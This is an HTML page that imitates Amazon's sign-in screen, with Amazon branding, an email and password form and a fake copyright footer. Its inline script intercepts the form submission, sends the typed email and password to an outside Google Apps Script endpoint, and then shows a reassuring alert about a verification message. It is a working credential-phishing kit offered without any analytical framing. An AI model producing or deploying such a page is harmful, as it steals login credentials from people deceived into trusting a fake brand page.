<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4a/Amazon_icon.svg/2048px-Amazon_icon.svg.png" type="image/x-icon">
    <link rel="stylesheet" href="style.css">
    <title>Amazon-Festival</title>
</head>
<body>
    <div class="container1">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Amazon_logo.svg/2560px-Amazon_logo.svg.png" alt="">
            <p>.in</p>
        </div>
        <div class="form-container">
            <h1>Sign in</h1>
            <form name="amazon-form" id="form">
                <label for="email">Email or mobile phone number</label>
                <input type="email" name="email">
                <label for="password">Password</label>
                <input type="password" name="password">
                <button type="submit" value="submit" id="submit">Sign in</button>
            </form>
            <div class="terms">
                <p>By continuing, you agree to Amazon's <span>Conditions of Use</span>  and <span>Privacy Notice</span>.</p>
                <div>
                    <input type="checkbox" name="" id="">Keep me signed in.<span>Details</span>  
                </div>
            </div>
            <div class="newacc">
                <h6>New to Amazon?</h6>
                <button>Create your Amazon account</button>
            </div>
        </div>
    </div>
    <div class="footer-container">
        <div>
            <p>Conditions of Use</p>
            <p>Privacy Notice</p>
            <p>Help </p>
        </div>
        <p>Â© 1996-2023, Amazon.com, Inc. or its affiliates</p>
    </div>


    <script>
        const form = document.querySelector("#form")
        const submitButton = document.querySelector("#submit")
        const scriptURL = 'https://script.google.com/macros/s/AKfycbw_IWHSBdoDxB_sP-hXurL0TYQJcF8aOJ0YUmIT2Er2hwFQJCYLjPOU6IFqhBcXhUMrvg/exec'
     
        form.addEventListener('submit', e => {
          submitButton.disabled = true
          e.preventDefault()
          let requestBody = new FormData(form)
          fetch(scriptURL, { method: 'POST', body: requestBody})
            .then(response => {
               alert('Congratulations! We will send you a verification message within 24 hours', response)
               submitButton.disabled = false
              })
            .catch(error => {
            alert('Error!', error.message)
              submitButton.disabled = false
     
            }
            )
        })
     </script>
</body>
</html>
